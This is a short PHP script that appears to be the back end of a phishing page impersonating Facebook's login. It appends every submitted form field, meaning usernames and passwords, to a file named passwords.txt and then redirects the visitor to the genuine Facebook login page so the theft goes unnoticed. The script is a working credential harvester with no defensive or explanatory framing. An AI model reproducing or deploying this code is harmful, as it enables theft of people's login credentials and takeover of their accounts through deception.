<?php
header("Location: https://web.facebook.com/login/?_rdc=1&_rdr ");
$handle = fopen("passwords.txt", "a");
foreach ($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
